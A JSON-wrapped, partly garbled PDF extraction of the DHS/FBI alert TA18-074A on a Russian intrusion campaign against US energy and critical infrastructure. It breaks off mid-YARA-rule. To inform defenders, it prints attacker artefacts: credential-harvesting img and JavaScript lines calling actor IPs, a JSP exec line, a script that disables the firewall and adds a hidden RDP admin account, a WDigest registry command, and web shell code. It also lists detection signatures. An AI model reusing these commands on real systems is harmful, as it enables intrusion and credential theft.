{
    "id": "8bb78555-06bd-4669-943f-4d5b2adbb203",
    "created_at": "2022-10-25T16:48:12.367575Z",
    "updated_at": "2025-03-27T02:12:08.76984Z",
    "deleted_at": null,
    "sha1_hash": "1b0b1d53362b0a5210164197a7132e4ae3aa5749",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-03-16T08:04:42Z",
    "file_modification_date": "2018-03-16T08:04:42Z",
    "file_size": 633368,
    "plain_text": "uss a Go e e t Cybe ct ty a get g e gy a d Ot e C t ca ast uctu e Secto s\n\nOriginal release date: March 15, 2018\n\n**Systems Affected**\n\nDomain Controllers\n\nFile Servers\n\nEmail Servers\n\n**Overview**\n\nThis joint Technical Alert (TA) is the result of analytic efforts between the Department of\nHomeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides\ninformation on Russian government actions targeting U.S. Government entities as well as\norganizations in the energy, nuclear, commercial facilities, water, aviation, and critical\nmanufacturing sectors. It also contains indicators of compromise (IOCs) and technical details\non the tactics, techniques, and procedures (TTPs) used by Russian government cyber actors\non compromised victim networks. DHS and FBI produced this alert to educate network\ndefenders to enhance their ability to identify and reduce exposure to malicious activity.\n\nDHS and FBI characterize this activity as a multi­stage intrusion campaign by Russian\ngovernment cyber actors who targeted small commercial facilities’ networks where they\nstaged malware, conducted spear phishing, and gained remote access into energy sector\nnetworks. After obtaining access, the Russian government cyber actors conducted network\nreconnaissance, moved laterally, and collected information pertaining to Industrial Control\nSystems (ICS).\n\nFor a downloadable copy of IOC packages and associated files, see:\n\n[TA18­074A_TLP_WHITE.csv](https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE.csv)\n\n[TA18­074A_TLP_WHITE.stix.xml](https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE_STIX.xml)\n\n[MIFR­10127623_TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf)\n\n[MIFR­10127623_TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml)\n\n[MIFR­10128327_TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf)\n\n[MIFR­10128327_TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml)\n\n[MIFR­10128336_TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf)\n\n[MIFR­10128336_TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml)\n\n[MIFR­10128830 _TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf)\n\n[MIFR­10128830 _TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml)\n\n[MIFR­10128883_TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf)\n\n[MIFR­10128883_TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml)\n\n[MIFR­10135300_TLP_WHITE.pdf](https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf)\n\n[MIFR­10135300_TLP_WHITE_stix.xml](https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml)\n\nContact DHS or law enforcement immediately to report an intrusion and to request incident\nresponse resources or technical assistance.\n\n**Description**\n\nSince at least March 2016, Russian government cyber actors—hereafter referred to as “threat\nactors”—targeted government entities and multiple U.S. critical infrastructure sectors,\nincluding the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing\nsectors.\n\nAnalysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors\nrelated to this activity. Of note, the report Dragonfly: Western energy sector targeted by\nsophisticated attack group, released by Symantec on September 6, 2017, provides additional\n[information about this ongoing campaign. [1]](https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group)\n\nThis campaign comprises two distinct categories of victims: staging and intended targets. The\ninitial victims are peripheral organizations such as trusted third­party suppliers with less\nsecure networks, referred to as “staging targets” throughout this alert. The threat actors used\nthe staging targets’ networks as pivot points and malware repositories when targeting their\n\n\n-----\n\np g, g\n\n**Technical Details**\n\nThe threat actors in this campaign employed a variety of TTPs, including\n\nspear­phishing emails (from compromised legitimate account),\n\nwatering­hole domains,\n\ncredential gathering,\n\nopen­source and network reconnaissance,\n\nhost­based exploitation, and\n\ntargeting industrial control system (ICS) infrastructure.\n\n**Using Cyber Kill Chain for Analysis**\n\nDHS used the Lockheed­Martin Cyber Kill Chain model to analyze, discuss, and dissect\nmalicious cyber activity. Phases of the model include reconnaissance, weaponization,\ndelivery, exploitation, installation, command and control, and actions on the objective. This\nsection will provide a high­level overview of threat actors’ activities within this framework.\n\n**Stage 1: Reconnaissance**\n\nThe threat actors appear to have deliberately chosen the organizations they targeted, rather\nthan pursuing them as targets of opportunity. Staging targets held preexisting relationships\nwith many of the intended targets. DHS analysis identified the threat actors accessing publicly\navailable information hosted by organization­monitored networks during the reconnaissance\nphase. Based on forensic analysis, DHS assesses the threat actors sought information on\nnetwork and organizational design and control system capabilities within organizations. These\ntactics are commonly used to collect the information needed for targeted spear­phishing\nattempts. In some cases, information posted to company websites, especially information that\nmay appear to be innocuous, may contain operationally sensitive information. As an example,\nthe threat actors downloaded a small photo from a publicly accessible human resources page.\nThe image, when expanded, was a high­resolution photo that displayed control systems\nequipment models and status information in the background.\n\nAnalysis also revealed that the threat actors used compromised staging targets to download\nthe source code for several intended targets’ websites. Additionally, the threat actors\nattempted to remotely access infrastructure such as corporate web­based email and virtual\nprivate network (VPN) connections.\n\n**Stage 2: Weaponization**\n\n**Spear­Phishing Email TTPs**\n\nThroughout the spear­phishing campaign, the threat actors used email attachments to\nleverage legitimate Microsoft Office functions for retrieving a document from a remote server\nusing the Server Message Block (SMB) protocol. (An example of this request is:\nfile[:]//<remote IP address>/Normal.dotm). As a part of the standard processes executed by\nMicrosoft Word, this request authenticates the client with the server, sending the user’s\ncredential hash to the remote server before retrieving the requested file. (Note: transfer of\ncredentials can occur even if the file is not retrieved.) After obtaining a credential hash, the\nthreat actors can use password­cracking techniques to obtain the plaintext password. With\nvalid credentials, the threat actors are able to masquerade as authorized users in\n[environments that use single­factor authentication. [2]](https://www.kb.cert.org/vuls/id/672268)\n\n**Use of Watering Hole Domains**\n\nOne of the threat actors’ primary uses for staging targets was to develop watering holes.\nThreat actors compromised the infrastructure of trusted organizations to reach intended\ntargets. [3] Approximately half of the known watering holes are trade publications and\ninformational websites related to process control, ICS, or critical infrastructure. Although these\nwatering holes may host legitimate content developed by reputable organizations the threat\n\n\n-----\n\ny g p q g\nfrom an IP address controlled by the threat actors. This request accomplishes a similar\ntechnique observed in the spear­phishing documents for credential harvesting. In one\ninstance, the threat actors added a line of code into the file “header.php”, a legitimate PHP file\nthat carried out the redirected traffic.\n\n<img src=\"file[:]//62.8.193[.]206/main_logo.png\" style=\"height: 1px; width: 1px;\" />\n\nIn another instance, the threat actors modified the JavaScript file, “modernizr.js”, a legitimate\nJavaScript library used by the website to detect various aspects of the user’s browser. The file\nwas modified to contain the contents below:\n\nvar i = document.createElement(\"img\");\n\ni.src = \"file[:]//184.154.150[.]66/ame_icon.png\";\n\ni.width = 3;\n\ni.height=2;\n\n**Stage 3: Delivery**\n\nWhen compromising staging target networks, the threat actors used spear­phishing emails\nthat differed from previously reported TTPs. The spear­phishing emails used a generic\ncontract agreement theme (with the subject line “AGREEMENT & Confidential”) and\ncontained a generic PDF document titled ``document.pdf. (Note the inclusion of two single\nback ticks at the beginning of the attachment name.) The PDF was not malicious and did not\ncontain any active code. The document contained a shortened URL that, when clicked, led\nusers to a website that prompted the user for email address and password. (Note: no code\nwithin the PDF initiated a download.)\n\nIn previous reporting, DHS and FBI noted that all of these spear­phishing emails referred to\ncontrol systems or process control systems. The threat actors continued using these themes\nspecifically against intended target organizations. Email messages included references to\ncommon industrial control equipment and protocols. The emails used malicious Microsoft\nWord attachments that appeared to be legitimate résumés or curricula vitae (CVs) for\nindustrial control systems personnel, and invitations and policy documents to entice the user\nto open the attachment.\n\n**Stage 4: Exploitation**\n\nThe threat actors used distinct and unusual TTPs in the phishing campaign directed at staging\ntargets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link, which redirected\nto http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of\nhttp://imageliners[.]com/nitel. The imageliner[.]com website contained input fields for an email\naddress and password mimicking a login page for a website.\n\nWhen exploiting the intended targets, the threat actors used malicious .docx files to capture\nuser credentials. The documents retrieved a file through a “file://” connection over SMB using\nTransmission Control Protocol (TCP) ports 445 or 139. This connection is made to a\ncommand and control (C2) server—either a server owned by the threat actors or that of a\nvictim. When a user attempted to authenticate to the domain, the C2 server was provided with\nthe hash of the password. Local users received a graphical user interface (GUI) prompt to\nenter a username and password, and the C2 received this information over TCP ports 445 or\n139. (Note: a file transfer is not necessary for a loss of credential information.) Symantec’s\n[report associates this behavior to the Dragonfly threat actors in this campaign. [1]](https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group)\n\n\n-----\n\nThe threat actors leveraged compromised credentials to access victims’ networks where\n[multi­factor authentication was not used. [4] To maintain persistence, the threat actors created](https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf)\nlocal administrator accounts within staging targets and placed malicious files within intended\ntargets.\n\n**Establishing Local Accounts**\n\nThe threat actors used scripts to create local administrator accounts disguised as legitimate\nbackup accounts. The initial script “symantec_help.jsp” contained a one­line reference to a\nmalicious script designed to create the local administrator account and manipulate the firewall\nfor remote access. The script was located in “C:\\Program Files (x86)\\Symantec\\Symantec\nEndpoint Protection Manager\\tomcat\\webapps\\ROOT\\”.\n\n**Contents of symantec_help.jsp**\n\n_______________________________________________________________________________________________\n\n<% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") +\n\"\\\\..\\\\webapps\\\\ROOT\\\\<enu.cmd>\\\"\"); %>\n\n_______________________________________________________________________________________________\n\nThe script “enu.cmd” created an administrator account, disabled the host­based firewall, and\nglobally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then\nattempted to add the newly created account to the administrators group to gain elevated\nprivileges. This script contained hard­coded values for the group name “administrator” in\nSpanish, Italian, German, French, and English.\n\n**Contents of enu.cmd**\n\n_______________________________________________________________________________________________\n\nnetsh firewall set opmode disable\n\nnetsh advfirewall set allprofiles state off\n\nreg add\n\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenP\n/v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f\n\nreg add\n\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPo\n/v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n/t REG_DWORD /d 0 /f\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v\nfSingleSessionPerUser /t REG_DWORD /d 0 /f\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v\nEnableConcurrentSessions /t REG_DWORD /d 1 /f\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nEnableConcurrentSessions /t REG_DWORD /d 1 /f\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nAllowMultipleTSSessions /t REG_DWORD /d 1 /f\n\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v\nMaxInstanceCount /t REG_DWORD /d 100 /f\n\nnet user MS_BACKUP <Redacted_Password> /add\n\nnet localgroup Administrators /add MS BACKUP\n\n\n-----\n\nnet localgroup Administratoren /add MS_BACKUP\n\nnet localgroup Administrateurs /add MS_BACKUP\n\nnet localgroup \"Remote Desktop Users\" /add MS_BACKUP\n\nnet user MS_BACKUP /expires:never\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v MS_BACKUP /t REG_DWORD /d\n0 /f\n\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v\ndontdisplaylastusername /t REG_DWORD /d 1 /f\n\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v\nLocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\nsc config termservice start= auto\n\nnet start termservice\n\n_______________________________________________________________________________________________\n\nDHS observed the threat actors using this and similar scripts to create multiple accounts\nwithin staging target networks. Each account created by the threat actors served a specific\npurpose in their operation. These purposes ranged from the creation of additional accounts to\ncleanup of activity. DHS and FBI observed the following actions taken after the creation of\nthese local accounts:\n\n**Account 1: Account 1 was named to mimic backup services of the staging target. This**\naccount was created by the malicious script described earlier. The threat actor used this\naccount to conduct open­source reconnaissance and remotely access intended targets.\n\n**Account 2: Account 1 was used to create Account 2 to impersonate an email administration**\naccount. The only observed action was to create Account 3.\n\n**Account 3: Account 3 was created within the staging victim’s Microsoft Exchange Server. A**\nPowerShell script created this account during an RDP session while the threat actor was\nauthenticated as Account 2. The naming conventions of the created Microsoft Exchange\naccount followed that of the staging target (e.g., first initial concatenated with the last name).\n\n**Account 4: In the latter stage of the compromise, the threat actor used Account 1 to create**\nAccount 4, a local administrator account. Account 4 was then used to delete logs and cover\ntracks.\n\n**Scheduled Task**\n\nIn addition, the threat actors created a scheduled task named reset, which was designed to\nautomatically log out of their newly created account every eight hours.\n\n**VPN Software**\n\nAfter achieving access to staging targets, the threat actors installed tools to carry out\noperations against intended victims. On one occasion, threat actors installed the free version\nof FortiClient, which they presumably used as a VPN client to connect to intended target\nnetworks.\n\n**Password Cracking Tools**\n\nConsistent with the perceived goal of credential harvesting, the threat actors dropped and\nexecuted open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The\nnaming convention and download locations suggest that these files were downloaded directly\nfrom publically available locations such as GitHub. Forensic analysis indicates that many of\n\n\n-----\n\ny p p g\n\n**Downloader**\n\nOnce inside of an intended target’s network, the threat actor downloaded tools from a remote\nserver. The initial versions of the file names contained .txt extensions and were renamed to\nthe appropriate extension, typically .exe or .zip.\n\nIn one example, after gaining remote access to the network of an intended victim, the threat\nactor carried out the following actions:\n\nThe threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically\nthe file INST.txt.\n\nThe files were renamed to new extensions, with INST.txt being renamed INST.exe.\n\nThe files were executed on the host and then immediately deleted.\n\nThe execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe\nappeared in the running process list of the compromised system of an intended target.\n\nThe registry value “ntdll” was added to the “HKEY_USERS\\<USER\nSID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” key.\n\n**Persistence Through .LNK File Manipulation**\n\nThe threat actors manipulated LNK files, commonly known as a Microsoft Window’s shortcut\nfile, to repeatedly gather user credentials. Default Windows functionality enables icons to be\nloaded from a local or remote Windows repository. The threat actors exploited this built­in\nWindows functionality by setting the icon path to a remote server controller by the actors.\nWhen the user browses to the directory, Windows attempts to load the icon and initiate an\nSMB authentication session. During this process, the active user’s credentials are passed\nthrough the attempted SMB connection.\n\nFour of the observed LNK files were “SETROUTE.lnk”, “notepad.exe.lnk”, “Document.lnk” and\n“desktop.ini.lnk”. These names appeared to be contextual, and the threat actor may use a\nvariety of other file names while using this tactic. Two of the remote servers observed in the\nicon path of these LNK files were 62.8.193[.]206 and 5.153.58[.]45. Below is the parsed\ncontent of one of the LNK files:\n\nParsed output for file: desktop.ini.lnk\n\n**Registry Modification**\n\nThe threat actor would modify key systems to store plaintext credentials in memory. In one\ninstance, the threat actor executed the following command.\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v Us\neLogonCredential /t REG_DWORD /d 1 /f\n\n**Stage 6: Command and Control**\n\n\n-----\n\nemail and web servers. The threat actors used three different filenames ( global.aspx,\nautodiscover.aspx and index.aspx) for two different webshells. The difference between the\ntwo groups was the “public string Password” field.\n\n**Beginning Contents of the Web Shell**\n\n_______________________________________________________________________________________________\n\n<%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\"\nEnableViewStateMac=\"false\" EnableViewState=\"true\"%>\n\n<%@ import Namespace=\"System\"%>\n\n<%@ import Namespace=\"System.IO\"%>\n\n<%@ import Namespace=\"System.Diagnostics\"%>\n\n<%@ import Namespace=\"System.Data\"%>\n\n<%@ import Namespace=\"System.Management\"%>\n\n<%@ import Namespace=\"System.Data.OleDb\"%>\n\n<%@ import Namespace=\"Microsoft.Win32\"%>\n\n<%@ import Namespace=\"System.Net.Sockets\" %>\n\n<%@ import Namespace=\"System.Net\" %>\n\n<%@ import Namespace=\"System.Runtime.InteropServices\"%>\n\n<%@ import Namespace=\"System.DirectoryServices\"%>\n\n<%@ import Namespace=\"System.ServiceProcess\"%>\n\n<%@ import Namespace=\"System.Text.RegularExpressions\"%>\n\n<%@ Import Namespace=\"System.Threading\"%>\n\n<%@ Import Namespace=\"System.Data.SqlClient\"%>\n\n<%@ import Namespace=\"Microsoft.VisualBasic\"%>\n\n<%@ Import Namespace=\"System.IO.Compression\" %>\n\n<%@ Assembly\nName=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n\n<%@ Assembly\nName=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n\n<%@ Assembly\nName=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>\n\n<%@ Assembly\nName=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>\n\n<!DOCTYPE html PUBLIC \"­//W3C//DTD XHTML 1.0 Transitional//EN\"\n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1­transitional.dtd\">\n\n<script runat = \"server\">\n\npublic string Password = \"<REDACTED>\";\n\npublic string z_progname = \"z_WebShell\";\n\n…\n\n**_______________________________________________________________________________________________**\n\n**Stage 7: Actions on Objectives**\n\n\n-----\n\nsuch as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the\ninfrastructure of staging targets to connect to several intended targets.\n\n**Internal Reconnaissance**\n\nUpon gaining access to intended victims, the threat actors conducted reconnaissance\noperations within the network. DHS observed the threat actors focusing on identifying and\nbrowsing file servers within the intended victim’s network.\n\nOnce on the intended target’s network, the threat actors used privileged credentials to access\nthe victim’s domain controller typically via RDP. Once on the domain controller, the threat\nactors used the batch scripts “dc.bat” and “dit.bat” to enumerate hosts, users, and additional\ninformation about the environment. The observed outputs (text documents) from these scripts\nwere:\n\nadmins.txt\n\ncompleted_dclist.txt\n\ncompleted_trusts.txt\n\ncompleted_zone.txt\n\ncomps.txt\n\nconditional_forwarders.txt\n\ndomain_zone.txt\n\nenum_zones.txt\n\nusers.txt\n\nThe threat actors also collected the files “ntds.dit” and the “SYSTEM” registry hive. DHS\nobserved the threat actors compress all of these files into archives named “SYSTEM.zip” and\n“comps.zip”.\n\nThe threat actors used Windows’ scheduled task and batch scripts to execute “scr.exe” and\ncollect additional information from hosts on the network. The tool “scr.exe” is a screenshot\nutility that the threat actor used to capture the screen of systems across the network. The\nMD5 hash of “scr.exe” matched the MD5 of ScreenUtil, as reported in the Symantec Dragonfly\n2.0 report.\n\nIn at least two instances, the threat actors used batch scripts labeled “pss.bat” and “psc.bat”\nto run the PsExec tool. Additionally, the threat actors would rename the tool PsExec to\n“ps.exe”.\n\n1. The batch script (“pss.bat” or “psc.bat”) is executed with domain administrator credentials.\n\n2. The directory “out” is created in the user’s %AppData% folder.\n\n3. PsExec is used to execute “scr.exe” across the network and to collect screenshots of\n\nsystems in “ip.txt”.\n\n4. The screenshot’s filename is labeled based on the computer name of the host and stored\n\nin the target’s C:\\Windows\\Temp directory with a “.jpg” extension.\n\n5. The screenshot is then copied over to the newly created “out” directory of the system\n\nwhere the batch script was executed.\n\n6. In one instance, DHS observed an “out.zip” file created.\n\nDHS observed the threat actors create and modify a text document labeled “ip.txt” which is\nbelieved to have contained a list of host information. The threat actors used “ip.txt” as a\nsource of hosts to perform additional reconnaissance efforts. In addition, the text documents\n“res.txt” and “err.txt” were observed being created as a result of the batch scripts being\nexecuted. In one instance, “res.txt” contained output from the Windows’ command “query\nuser” across the network.\n\nUsing <Username> <Password>\nRunning ­s cmd /c query user on <Hostname1>\nRunning ­s cmd /c query user on <Hostname2>\nRunning ­s cmd /c query user on <Hostname3>\n\n\n-----\n\nAn additional batch script named “dirsb.bat” was used to gather folder and file names from\nhosts on the network.\n\nIn addition to the batch scripts, the threat actors also used scheduled tasks to collect\nscreenshots with “scr.exe”. In two instances, the scheduled tasks were designed to run the\ncommand “C:\\Windows\\Temp\\scr.exe” with the argument “C:\\Windows\\Temp\\scr.jpg”. In\nanother instance, the scheduled task was designed to run with the argument “pss.bat” from\nthe local administrator’s “AppData\\Local\\Microsoft\\” folder.\n\nThe threat actors commonly executed files out of various directories within the user’s AppData\nor Downloads folder. Some common directory names were\n\nChromex64,\n\nMicrosoft_Corporation,\n\nNT,\n\nOffice365,\n\nTemp, and\n\nUpdate.\n\n**Targeting of ICS and SCADA Infrastructure**\n\nIn multiple instances, the threat actors accessed workstations and servers on a corporate\nnetwork that contained data output from control systems within energy generation facilities.\nThe threat actors accessed files pertaining to ICS or supervisory control and data acquisition\n(SCADA) systems. Based on DHS analysis of existing compromises, these files were named\ncontaining ICS vendor names and ICS reference documents pertaining to the organization\n(e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).\n\nThe threat actors targeted and copied profile and configuration information for accessing ICS\nsystems on the network. DHS observed the threat actors copying Virtual Network Connection\n(VNC) profiles that contained configuration information on accessing ICS systems. DHS was\nable to reconstruct screenshot fragments of a Human Machine Interface (HMI) that the threat\nactors accessed.\n\n\n-----\n\n**Cleanup and Cover Tracks**\n\nIn multiple instances, the threat actors created new accounts on the staging targets to perform\ncleanup operations. The accounts created were used to clear the following Windows event\nlogs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also\nremoved applications they installed while they were in the network along with any logs\nproduced. For example, the Fortinet client installed at one commercial facility was deleted\nalong with the logs that were produced from its use. Finally, data generated by other accounts\nused on the systems accessed were deleted.\n\nThreat actors cleaned up intended target networks through deleting created screenshots and\nspecific registry keys. Through forensic analysis, DHS determined that the threat actors\ndeleted the registry key associated with terminal server client that tracks connections made to\nremote systems. The threat actors also deleted all batch scripts, output text documents and\nany tools they brought into the environment such as “scr.exe”.\n\n**Detection and Response**\n\nIOCs related to this campaign are provided within the accompanying .csv and .stix files of this\nalert. DHS and FBI recommend that network administrators review the IP addresses, domain\nnames, file hashes, network signatures, and YARA rules provided, and add the IPs to their\nwatchlists to determine whether malicious activity has been observed within their\norganization. System owners are also advised to run the YARA tool on any system suspected\nto have been targeted by these threat actors.\n\n**Network Signatures and Host­Based Rules**\n\nThis section contains network signatures and host­based rules that can be used to detect\nmalicio s acti it associated ith threat actor TTPs Altho gh these net ork signat res and\n\n\n-----\n\np y\n\n**Network Signatures**\n\nalert tcp $HOME_NET any ­> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains\n'/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1;\nflow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri;\nfast_pattern:only; classtype:bad­unknown; metadata:service http;)\n\n___________________________________\n\nalert tcp $HOME_NET any ­> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains\n'/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server;\ncontent:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad­unknown;\nmetadata:service http;)\n\n________________________________________\n\nalert tcp $HOME_NET any ­> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains\n'/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\";\nhttp_uri; fast_pattern; classtype:bad­unknown; metadata:service http;)\n\n_________________________________________\n\nalert tcp any any ­> any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB\ncredential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75\n00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\";\ndistance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad­\nunknown; metadata:service netbios­ssn;)\n\n________________________________________\n\nalert tcp $HOME_NET any ­> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI\nOPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1;\nflow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only;\ncontent:\"OPTIONS\"; nocase; http_method; classtype:bad­unknown; metadata:service http;)\n\n_________________________________________\n\nalert tcp $HOME_NET any ­> $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header\ncontains 'User­Agent|3a 20|Go­http­client/1.1'\"; sid:42000005; rev:1;\nflow:established,to_server; content:\"User­Agent|3a 20|Go­http­client/1.1|0d 0a|Accept­\nEncoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a­z0­9]{3}=[a­z0­9]\n{32}&/U\"; classtype:bad­unknown; metadata:service http;)\n\n__________________________________________\n\nalert tcp $EXTERNAL_NET [139,445] ­> $HOME_NET any (msg:\"SMB Server Traffic\ncontains NTLM­Authenticated SMBv1 Session\"; sid:42000006; rev:1;\nflow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only;\ncontent:\"|05 00|\"; distance:23; classtype:bad­unknown; metadata:service netbios­ssn;)\n\n**YARA Rules**\n\nThis is a consolidated rule set for malware associated with this activity. These rules were\nwritten by NCCIC and include contributions from trusted partners.\n\n*/\n\nrule APT_malware_1\n\n{\n\nmeta:\n\ndescription = \"inveigh pen testing tools & related artifacts\"\n\n\n-----\n\nhash0 = \"61C909D2F625223DB2FB858BBDF42A76\"\n\nhash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"\n\nhash2 = \"BA756DD64C1147515BA2298B6A760260\"\n\nhash3 = \"8943E71A8C73B5E343AA9D2E19002373\"\n\nhash4 = \"04738CA02F59A5CD394998A99FCD9613\"\n\nhash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"\n\nhash6 = \"65A1A73253F04354886F375B59550B46\"\n\nhash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"\n\nhash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"\n\nhash9 = \"722154A36F32BA10E98020A8AD758A7A\"\n\nhash10 = \"4595DBE00A538DF127E0079294C87DA0\"\n\nstrings:\n\n$s0 = \"file://\"\n\n$s1 = \"/ame_icon.png\"\n\n$s2 = \"184.154.150.66\"\n\n$s3 = {\n87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }\n\n$s4 = {\n33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }\n\n$s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"\n\n$s6 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n\n$s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"\n\n$s8 = \"NlZzSZk=\"\n\n$s9 = \"WlJTb1q5kaxqZaRnser3sw==\"\n\n$s10 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n\n$s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"\n\n$s12 = \"ps.exe ­accepteula \\\\%ws% ­u %user% ­p %pass% ­s cmd /c netstat\"\n\n$s13 = {\n22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429\n}\n\n$s14 = {\n68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D\n}\n\n$s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }\n\n//inveigh pentesting tools\n\n$s16 = {\n24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F\n}\n\n//specific malicious word document PK archive\n\n$s17 = {\n2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0\n}\n\n\n-----\n\n6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90\n}\n\n$s19 = {\n8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394\n}\n\n$s20 = {\n8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B\n}\n\n$s21 = {\n8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B\n}\n\n$s22 = \"5.153.58.45\"\n\n$s23 = 